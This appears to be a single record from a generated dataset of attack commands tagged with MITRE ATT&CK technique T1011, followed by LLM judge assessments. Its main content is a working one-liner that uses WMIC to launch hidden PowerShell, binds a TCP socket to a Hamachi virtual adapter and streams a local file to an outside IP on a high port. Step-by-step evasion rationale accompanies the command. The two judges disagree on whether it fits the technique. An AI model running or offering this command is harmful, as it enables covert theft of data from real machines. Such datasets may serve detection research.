command: wmic process call create "powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\Users\Public\Downloads\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }"
explanation: Uses WMIC to start a hidden PowerShell that binds to a Hamachi virtual adapter and exfiltrates data via TCP on an unusual port. A third-party virtual NIC provides an alternate medium in line with T1011.
rationale_steps: Discover the Hamachi virtual NIC using WMI.
Bind the TCP client to the Hamachi interface to force that egress path.
Connect to an external server using a high port uncommon in enterprise traffic.
Stream file bytes through the virtual network medium per T1011.
Avoid any system-wide routing or adapter changes.

llm_judgments.syntactic_justification: The WMIC wrapper and embedded PowerShell are well-formed with balanced quotes and parentheses, valid flags, proper separators, and correctly escaped variables and strings.
llm_judgments.semantic_justification: While it plausibly exfiltrates a file over TCP bound to a Hamachi adapter, it does not exhibit Traffic Signaling behaviors (no covert signaling via headers/timing/fields or triggers) and uses a documentation-only IP, so alignment with the stated T1011 technique is weak.

llm_judgments.syntactic_justification: The command is perfectly well-formed, correctly escaping variables with backticks for PowerShell and using single quotes for internal strings to avoid issues with WMIC's double-quote encapsulation.
llm_judgments.semantic_justification: The command precisely achieves its claimed intent by using WMIC to execute a hidden PowerShell script that explicitly binds to a Hamachi virtual network adapter and exfiltrates data, leveraging an alternate, less-monitored medium consistent with T1011's focus on covert or out-of-band channels for communication.
